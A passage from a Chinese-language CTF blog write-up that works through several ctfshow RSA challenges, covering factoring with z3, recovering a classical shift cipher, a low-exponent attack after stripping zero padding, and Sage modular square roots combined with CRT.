2*1024-1)</code>这两句一加上就报错，没办法删了，解出来的p、q也不满足大小要求😭</p><p>看了下<a href="https://zhuanlan.zhihu.com/p/370374186">wp</a></p><p>奥！傻了，n=p*q忘记加了</p><p>再用z3跑，出了，我觉得万事大吉！</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">n, tmp, c = </span><br><span class="line">e = <span class="number">0</span>o200001</span><br><span class="line"></span><br><span class="line">A = <span class="keyword">int</span>(gmpy2.invert(tmp, n))</span><br><span class="line">from z3 import *</span><br><span class="line"><span class="meta"># S = Solver()</span></span><br><span class="line"><span class="meta"># p = Int(&#x27;p&#x27;)</span></span><br><span class="line"><span class="meta"># q = Int(&#x27;q&#x27;)</span></span><br><span class="line"><span class="meta"># S.add(q &gt; 2**1023)</span></span><br><span class="line"><span class="meta"># S.add((p &gt; 2**1023))</span></span><br><span class="line"><span class="meta"># S.add(p*q == n)</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># S.add((2021*p + 501*q) % n == A)</span></span><br><span class="line"><span class="meta"># if S.check():</span></span><br><span class="line"><span class="meta">#     print(S.model())</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">118025808013874567502972067396154378205921004159004592806833496003217679639841107629090128959992942958292926872941356148283178987927403535617729247751812776636333788905610726461255956234207606642302396722821445909489968841256943549868105578713493559907241758893208485830735235619636112619927867287431575647321</span></span><br><span class="line">q = <span class="number">177482332140024816122816575300851746457741976238942019223639223243373845838446387378093437677008231609976122718397287922224412805145965728166071230572137942154170172214953182121671014605624049869925600226560127948579957435119412752482229481128742488177414523194528098131635883615390771259266866469500527361157</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="keyword">int</span>(pow(c, d, n))</span><br><span class="line">print(libnum.n2s(m))</span><br><span class="line"><span class="meta"># emkkocy&#123;lnyu_wp_kxs_kc_ahz_dvjg_by?&#125;</span></span><br></pre></td></tr></table></figure><p>❓这明显是古典加密过了</p><p>尝试了凯撒、维吉尼亚、quip无果</p><p>实在没办法，看了下<a href="https://zhuanlan.zhihu.com/p/370374186">wp</a>,春哥写的有些复杂（我看不下去😕），但我看到其解题的思想</p><p><strong>于是，自己开始尝试当密码学家了！</strong></p><p>明确已知和未知</p><ul><li>c = emkkocy{lnyu_wp_kxs_kc_ahz_dvjg_by?}</li><li>m = ctfshow….</li></ul><p>显然，像是<code>&#123; _ &#125;</code>这些符号没有参与加密，剔除之</p><p>于是有</p><ul><li>c =  emkkocylnyuwpkxskcahzdvjgby</li><li>m = ctfshow</li></ul><p>古典的本质是规律，尝试找到这些字符ASCII之间的关系</p><p>用密文-已知明文（c-m=key）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;emkkocy&#123;lnyu_wp_kxs_kc_ahz_dvjg_by?&#125;&#x27;</span></span><br><span class="line">flag_ = <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    a = <span class="built_in">ord</span>(flag[i])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        b = <span class="built_in">ord</span>(flag_[i])</span><br><span class="line">        key.append(a - b)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"><span class="comment"># [2, -7, 5, -8, 7, -12, 2]</span></span><br></pre></td></tr></table></figure><p>🤔没什么特别明显的规律，因为2出现了两次不妨大胆猜测一个周期有：2, -7, 5, -8, 7, -12</p><p>则：明文 = 密文 - 密钥 (m=c-key)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">2</span>, -<span class="number">7</span>, <span class="number">5</span>, -<span class="number">8</span>, <span class="number">7</span>, -<span class="number">12</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;emkkocylnyuwpkxskcahzdvjgby&#x27;</span>  <span class="comment"># 去掉非字母部分</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag_ = <span class="built_in">ord</span>(flag[i]) - key[i % <span class="number">6</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag_), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># ctfshowsinnrs&#123;do_ouloveit</span></span><br></pre></td></tr></table></figure><p>有不是字母的字符，这就得约定好范围（小写字母）</p><p>这种思路源自 凯撒密码为代表的古典密码 用的 mod26 的思想</p><p>于是有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">2</span>, -<span class="number">7</span>, <span class="number">5</span>, -<span class="number">8</span>, <span class="number">7</span>, -<span class="number">12</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;emkkocylnyuwpkxskcahzdvjgby&#x27;</span>  <span class="comment"># 去掉非字母部分</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))  <span class="comment"># 97</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>))  <span class="comment"># 122</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag_ = <span class="built_in">ord</span>(flag[i]) - key[i % <span class="number">6</span>]</span><br><span class="line">    <span class="keyword">if</span> flag_ &lt; <span class="number">97</span>:</span><br><span class="line">        flag_ = <span class="number">122</span> - (<span class="number">97</span> - flag_) + <span class="number">1</span>  <span class="comment"># like 96 对应122（z）</span></span><br><span class="line">    <span class="keyword">if</span> flag_ &gt; <span class="number">122</span>:</span><br><span class="line">        flag_ = (flag_-<span class="number">122</span>) + <span class="number">97</span> - <span class="number">1</span>  <span class="comment"># like 123 对应 97(a)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag_), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># ctfshowsigninrsadoyouloveit</span></span><br></pre></td></tr></table></figure><p>可知，flag为<code>ctfshow&#123;sign_in_rsa_do_you_love_it?&#125;</code></p><h3 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h3><p>除了学会灵活性的处理rsa问题外，还对古典密码加深了认知</p><p>这后一点尤为关键，队内已出现过只差一步解密出flag的情况了，密码手得给力，一锤定音！</p><p>总之，对于古典密码找规律解密，有：</p><ul><li>古典明文以<strong>字母</strong>为内容</li><li>古典算法以<strong>模的运算</strong>为方法</li><li>古典解密以<strong>约束住范围</strong>为关键</li></ul><p>👴不只会 一一对应的古典密码解密了</p><p>哦耶✌️</p><p>（<strong>实测维吉尼亚还得要全部密文来破解正确密钥！此法无效</strong>）</p><h2 id="ctfshow-摆烂杯-easy-peasy"><a href="#ctfshow-摆烂杯-easy-peasy" class="headerlink" title="ctfshow 摆烂杯 easy-peasy"></a>ctfshow 摆烂杯 easy-peasy</h2><p>据说还是签到题（la佬恐怖如斯Orz）</p><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">l = <span class="built_in">len</span>(flag)</span><br><span class="line"><span class="keyword">assert</span>(l == <span class="number">86</span>)</span><br><span class="line">m = bytes_to_long(<span class="string">b&#x27;\x00&#x27;</span> * (l - <span class="number">1</span>) + flag + <span class="string">b&#x27;\x00&#x27;</span> * (l - <span class="number">2</span>))</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 23570098360097260908266914080954003513706885568390448463720576188146956287111601604870247233822682630020002051748117520481402155749832096007629686239669192722978473890311246293580246256300691145653885805730865515297134808702766299205253761028235483781919393575836334910012714628455073300114978717047912395404034141622115001451888302617428376998024080880564792294546406688814397757714979980790018933407614160131827023349206138480523080173634617167828920519758917549492886733519381497665596997617399404664611446202014908853898043742964782757859701755202188366852773164911994663079171498909577012208742001609095258401847</span></span><br><span class="line"><span class="comment"># c = 7802816471025387606454709075933309958303134972861203739854774032383575355964299097074709350633475519273512630813578801152996777689686451397201513854823239337669091889776200179028891111154423623765139235199507280104544068425347533121731521700106757148551520759776111224072064131087547685154285120156917449926992033491342535410929828988598182819897435365878832122138552492908774845437576910276499625679469289655841639181182040186931130789588869657335253479416209378458303531995734157105918063227453396477282662136225029972745246845372963076381252679409317314514131852117346576265346926741908194011319430767975281696400</span></span><br></pre></td></tr></table></figure><h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><ul><li>n分不出来，没有p、q，无法直接有限域开方</li><li>e=3，维纳无效，低e攻击跑了很久没结果</li></ul><p>觉得能利用的只有m末尾的<code>b&#39;\x00&#39; * (l - 2)</code>，但🤔想不出，没见过，实在不知如何利用</p><p>看其他师傅的<a href="https://www.aisoutu.com/a/2109167">题解</a></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220513165548541.png" alt="破题点"></p><p>🐮啊.</p><p>但I=86，I-2不是84吗？(确实是师傅着急写错了)</p><p>我领悟</p><p>不知道p、q就断然不是有限域开方</p><p><strong>e=3,只能对应低e攻击</strong></p><p>再由以上规律，得：</p><p>$m = (flag)•16^{2•84}$</p><p>$c = m^e \mod n = flag^3 • 16^{2•3•84}\mod n$</p><p>$c’ = c•inv(16^{2•3•84}, n) \mod n = flag^3 \mod n $</p><p>将c改小后，简单的低加密指数即可解！</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import</span> gmpy2</span><br><span class="line"><span class="built_in">import</span> libnum</span><br><span class="line"><span class="comment"># m越长越不利于爆破出结果</span></span><br><span class="line"></span><br><span class="line">def de(c, e, n):</span><br><span class="line">    <span class="attr">k</span> = <span class="number">0</span></span><br><span class="line">    while True:</span><br><span class="line">        print(k)</span><br><span class="line">        <span class="attr">mm</span> = c + n*k</span><br><span class="line">        result, <span class="attr">flag</span> = gmpy2.iroot(mm, e)</span><br><span class="line">        <span class="keyword">if</span> <span class="attr">True</span> == flag:</span><br><span class="line">            return result</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"><span class="attr">e</span> = <span class="number">3</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">23570098360097260908266914080954003513706885568390448463720576188146956287111601604870247233822682630020002051748117520481402155749832096007629686239669192722978473890311246293580246256300691145653885805730865515297134808702766299205253761028235483781919393575836334910012714628455073300114978717047912395404034141622115001451888302617428376998024080880564792294546406688814397757714979980790018933407614160131827023349206138480523080173634617167828920519758917549492886733519381497665596997617399404664611446202014908853898043742964782757859701755202188366852773164911994663079171498909577012208742001609095258401847</span></span><br><span class="line"><span class="attr">c</span> = <span class="number">7802816471025387606454709075933309958303134972861203739854774032383575355964299097074709350633475519273512630813578801152996777689686451397201513854823239337669091889776200179028891111154423623765139235199507280104544068425347533121731521700106757148551520759776111224072064131087547685154285120156917449926992033491342535410929828988598182819897435365878832122138552492908774845437576910276499625679469289655841639181182040186931130789588869657335253479416209378458303531995734157105918063227453396477282662136225029972745246845372963076381252679409317314514131852117346576265346926741908194011319430767975281696400</span></span><br><span class="line"><span class="attr">A</span> = <span class="number">16</span>**(<span class="number">6</span>*<span class="number">84</span>)</span><br><span class="line">c *= int(gmpy2.invert(A, n))</span><br><span class="line"><span class="attr">c</span> = c % n  <span class="comment"># 容易忘，c不能比n大</span></span><br><span class="line"><span class="attr">m</span> = de(c,e,n)</span><br><span class="line">print(libnum.n2s(int(m)).decode())</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><p><strong>byte后每加一个16进制的‘0’则扩大为原来的16倍</strong></p></li><li><p>对于低e攻击，<strong>flag越长爆破越久以至于失效</strong>，所以我们最好能降低flag长度</p></li></ul><h2 id="ctfshow-摆烂杯-比烂为主"><a href="#ctfshow-摆烂杯-比烂为主" class="headerlink" title="ctfshow 摆烂杯 比烂为主"></a>ctfshow 摆烂杯 比烂为主</h2><p>太长了，i‘m lazy dog</p><h2 id="ctfshow-卷王杯-真·简单·不卷·现代密码签到"><a href="#ctfshow-卷王杯-真·简单·不卷·现代密码签到" class="headerlink" title="ctfshow 卷王杯 真·简单·不卷·现代密码签到"></a>ctfshow 卷王杯 真·简单·不卷·现代密码签到</h2><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import bytes_to_long</span><br><span class="line">from secrets import p,q,r,s,t,flag</span><br><span class="line"></span><br><span class="line">n = p * q * r * s * t</span><br><span class="line">e = <span class="number">2</span></span><br><span class="line">m = bytes_to_long(os.urandom(<span class="number">500</span>) + flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line">print(p,q,r,s,t,sep=&#x27;\n&#x27;)</span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">p, q, r, s, t = [<span class="number">14533236770094</span><span class="number">43037475489121</span><span class="number">60113939198078</span><span class="number">05143602947796</span><span class="number">03489683159139</span><span class="number">56664143693347</span><span class="number">22670260043860</span><span class="number">86939337681345</span><span class="number">75289286283267</span><span class="number">81072313789590</span><span class="number">31538290018262</span><span class="number">23446477799895</span><span class="number">49326542256234</span><span class="number">89170122167900</span><span class="number">77395795861238</span><span class="number">25735703515268</span><span class="number">78336390854157</span><span class="number">63850743538206</span><span class="number">98678141893973</span><span class="number">75117159577389</span><span class="number">82536382066693</span><span class="number">82215986070126</span>3,</span><br><span class="line"><span class="number">11666045825306</span><span class="number">76080440655233</span><span class="number">10547233337730</span><span class="number">58390213375609</span><span class="number">54733393900577</span><span class="number">38510707447906</span><span class="number">97118857721727</span><span class="number">48610473794040</span><span class="number">14140178165569</span><span class="number">60440446889771</span><span class="number">28468761084444</span><span class="number">68370709141219</span><span class="number">30229160140865</span><span class="number">27420062681860</span><span class="number">59762087155933</span><span class="number">13183732395267</span><span class="number">56279662998108</span><span class="number">91805398890428</span><span class="number">42057542516069</span><span class="number">65312366604809</span><span class="number">33905879208166</span><span class="number">09059148279476</span>3,</span><br><span class="line"><span class="number">15793172240285</span><span class="number">32454214362706</span><span class="number">09912823260313</span><span class="number">73094128315285</span><span class="number">64446419694032</span><span class="number">38646482562190</span><span class="number">53103839312408</span><span class="number">72325547547464</span><span class="number">64603598717356</span><span class="number">25557016608150</span><span class="number">15737273369772</span><span class="number">92059427220330</span><span class="number">16904461167497</span><span class="number">35697669668384</span><span class="number">98453232642731</span><span class="number">73795879170608</span><span class="number">69577622446869</span><span class="number">53294662693939</span><span class="number">60430086496163</span><span class="number">73255363793210</span><span class="number">27705854708492</span><span class="number">45333069070553</span>1,</span><br><span class="line"><span class="number">10097345168744</span><span class="number">95188547426737</span><span class="number">78783266158999</span><span class="number">45107205860634</span><span class="number">82220187978911</span><span class="number">47675959983616</span><span class="number">21000348447657</span><span class="number">76121344823119</span><span class="number">93701677242007</span><span class="number">75955695149438</span><span class="number">28330705633699</span><span class="number">64294544839433</span><span class="number">67108703759615</span><span class="number">97538252490189</span><span class="number">50693369209927</span><span class="number">95166777526708</span><span class="number">68961803957761</span><span class="number">50188902057785</span><span class="number">21476723065848</span><span class="number">72675872898099</span><span class="number">18132337927575</span><span class="number">67386856897667</span>9,</span><br><span class="line"><span class="number">93960345071948</span><span class="number">25523388212168</span><span class="number">36507975121293</span><span class="number">33868351496468</span><span class="number">89883473677044</span><span class="number">13987433007457</span><span class="number">03393838320587</span><span class="number">99895367825427</span><span class="number">22454003449285</span><span class="number">86394089488734</span><span class="number">27189754005167</span><span class="number">39966759736423</span><span class="number">47859306921527</span><span class="number">43085067333424</span><span class="number">34411801834609</span><span class="number">27865980713929</span><span class="number">78996358760854</span><span class="number">75548584912646</span><span class="number">14271309608925</span><span class="number">63427228229296</span><span class="number">40028976503550</span><span class="number">47792764365447</span>,</span><br><span class="line"><span class="number">91445979203817</span><span class="number">74885442906257</span><span class="number">31114946570229</span><span class="number">50572386009739</span><span class="number">73598305004391</span><span class="number">53461877036309</span><span class="number">85650745413847</span><span class="number">71979931799878</span><span class="number">38143926484813</span><span class="number">78103538584182</span><span class="number">00992191234142</span><span class="number">74019448957354</span><span class="number">03816811612193</span><span class="number">32611454834544</span><span class="number">29163462845625</span><span class="number">76701788434846</span><span class="number">98324641739324</span><span class="number">68749738801840</span><span class="number">62140416572783</span><span class="number">23855749902661</span><span class="number">75244879612251</span><span class="number">70619208805520</span><span class="number">11343608609622</span><span class="number">88578761723875</span><span class="number">87693989720099</span><span class="number">49575526258430</span><span class="number">28264881703909</span><span class="number">12847963305853</span><span class="number">49957724522615</span><span class="number">10510273593025</span><span class="number">89695621031122</span><span class="number">38020133587096</span><span class="number">82638602812847</span><span class="number">18523772255253</span><span class="number">57348919204333</span><span class="number">12169543266233</span><span class="number">94430043277489</span><span class="number">73224423132988</span><span class="number">37629884386205</span><span class="number">66310454882858</span><span class="number">59621661802413</span><span class="number">20179396288379</span><span class="number">49155135104679</span><span class="number">12312842687601</span><span class="number">47811704041901</span><span class="number">34680599837772</span><span class="number">73699192408773</span><span class="number">55180658145819</span><span class="number">73246200652105</span><span class="number">23913467414181</span><span class="number">48087528020358</span><span class="number">01470777890638</span><span class="number">08832356486197</span><span class="number">27137661588322</span><span class="number">15582655910692</span><span class="number">23727607585313</span><span class="number">24024361951552</span><span class="number">11806004351141</span><span class="number">31162272519949</span><span class="number">10146408993544</span><span class="number">12517514266834</span><span class="number">47701142156416</span><span class="number">86611362712676</span><span class="number">59196410340429</span><span class="number">27519834229168</span><span class="number">53633195227569</span><span class="number">81225115027451</span><span class="number">77547569813354</span><span class="number">28056582837296</span><span class="number">87038101588578</span><span class="number">59460406828090</span><span class="number">19968332476095</span><span class="number">61056829025771</span><span class="number">89283246483314</span><span class="number">68936557086221</span><span class="number">74073331032433</span><span class="number">36691401424548</span><span class="number">70238787640922</span><span class="number">89772784986912</span><span class="number">00028282744239</span><span class="number">51209137311011</span><span class="number">17921772289798</span><span class="number">67318546462714</span><span class="number">52129625693837</span><span class="number">46186362065657</span><span class="number">91541769138267</span><span class="number">08078984240079</span><span class="number">69732267338169</span><span class="number">39794717596194</span><span class="number">09023242568850</span><span class="number">48902343049776</span><span class="number">12220790858557</span><span class="number">63924636743774</span><span class="number">09754954500116</span><span class="number">76714198668471</span><span class="number">43881429968932</span><span class="number">52088822619184</span><span class="number">60708833888406</span><span class="number">18791252734662</span><span class="number">89128949210597</span><span class="number">35420931656953</span><span class="number">23656017890918</span><span class="number">05873725894569</span><span class="number">26690219114173</span><span class="number">19320204833217</span><span class="number">25385644896604</span><span class="number">40225377822914</span><span class="number">09742080795778</span><span class="number">42017850241660</span><span class="number">11709377791129</span>]</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><h3 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h3><p>易得，n的所有因子均为素数</p><p>小e，起初想把除p、q外的因子合并集体忽略一试，后发现m很大<code>m = bytes_to_long(os.urandom(500) + flag)</code>,无果</p><p>后使用不太熟悉的脚本来有限域开方,得解</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#脚本2</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line">import libnum</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = 2</span><br><span class="line">p, q, r, s, t, c = (145332367700944303747548912160113939198078051436029477960348968315913956664143693347226702600438608693933768134575289286283267810723137895903153829001826223446477799895493265422562348917012216790077395795861238257357035152687833639085415763850743538206986781418939737511715957738982536382066693822159860701263,</span><br><span class="line">116660458253067608044065523310547233337730583902133756095473339390057738510707447906971188577217274861047379404014140178165569604404468897712846876108444468370709141219302291601408652742006268186059762087155933131837323952675627966299810891805398890428420575425160696531236660480933905879208166090591482794763,</span><br><span class="line">157931722402853245421436270609912823260313730941283152856444641969403238646482562190531038393124087232554754746464603598717356255570166081501573727336977292059427220330169044611674973569766966838498453232642731737958791706086957762244686953294662693939604300864961637325536379321027705854708492453330690705531,</span><br><span class="line">100973451687449518854742673778783266158999451072058606348222018797891147675959983616210003484476577612134482311993701677242007759556951494382833070563369964294544839433671087037596159753825249018950693369209927951667775267086896180395776150188902057785214767230658487267587289809918132337927575673868568976679,</span><br><span class="line">93960345071948255233882121683650797512129333868351496468898834736770441398743300745703393838320587998953678254272245400344928586394089488734271897540051673996675973642347859306921527430850673334243441180183460927865980713929789963587608547554858491264614271309608925634272282292964002897650355047792764365447,</span><br><span class="line">9144597920381774885442906257311149465702295057238600973973598305004391534618770363098565074541384771979931799878381439264848137810353858418200992191234142740194489573540381681161219332611454834544291634628456257670178843484698324641739324687497388018406214041657278323855749902661752448796122517061920880552011343608609622885787617238758769398972009949575526258430282648817039091284796330585349957724522615105102735930258969562103112238020133587096826386028128471852377225525357348919204333121695432662339443004327748973224423132988376298843862056631045488285859621661802413201793962883794915513510467912312842687601478117040419013468059983777273699192408773551806581458197324620065210523913467414181480875280203580147077789063808832356486197271376615883221558265591069223727607585313240243619515521180600435114131162272519949101464089935441251751426683447701142156416866113627126765919641034042927519834229168536331952275698122511502745177547569813354280565828372968703810158857859460406828090199683324760956105682902577189283246483314689365570862217407333103243336691401424548702387876409228977278498691200028282744239512091373110111792177228979867318546462714521296256938374618636206565791541769138267080789842400796973226733816939794717596194090232425688504890234304977612220790858557639246367437740975495450011676714198668471438814299689325208882261918460708833888406187912527346628912894921059735420931656953236560178909180587372589456926690219114173193202048332172538564489660440225377822914097420807957784201785024166011709377791129)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p),<span class="attribute">implementation</span>=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line"><span class="attribute">f</span>=a^e-c</span><br><span class="line"><span class="attribute">mps</span>=f.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(q),<span class="attribute">implementation</span>=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line"><span class="attribute">g</span>=a^e-c</span><br><span class="line"><span class="attribute">mqs</span>=g.monic().roots()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># r</span></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(r),<span class="attribute">implementation</span>=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line"><span class="attribute">f</span>=a^e-c</span><br><span class="line"><span class="attribute">mrs</span>=f.monic().roots()</span><br><span class="line"></span><br><span class="line"><span class="comment"># s</span></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(s),<span class="attribute">implementation</span>=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line"><span class="attribute">f</span>=a^e-c</span><br><span class="line"><span class="attribute">mss</span>=f.monic().roots()</span><br><span class="line"></span><br><span class="line"><span class="comment"># t</span></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(t),<span class="attribute">implementation</span>=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line"><span class="attribute">f</span>=a^e-c</span><br><span class="line"><span class="attribute">mts</span>=f.monic().roots()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    A = mpp[0]</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        B = mqq[0]</span><br><span class="line">        <span class="keyword">for</span> mrr <span class="keyword">in</span> mrs:</span><br><span class="line">            C = mrr[0]</span><br><span class="line">            <span class="keyword">for</span> mss <span class="keyword">in</span> mss:</span><br><span class="line">                D = mss[0]</span><br><span class="line">                <span class="keyword">for</span> mtt <span class="keyword">in</span> mts:</span><br><span class="line">                    E = mtt[0]</span><br><span class="line">                    solution = CRT_list([int(A), int(B), int(C), int(D), int(E)], [p, q, r, s, t])</span><br><span class="line">                    flag = str(libnum.n2s(int(solution)))</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">                        <span class="builtin-name">print</span>(flag)</span><br><span class="line">                        break</span><br><span class="line">                break</span><br><span class="line">            break</span><br><span class="line">        break</span><br><span class="line">    break</span><br><span class="line"><span class="builtin-name">print</span>(<span 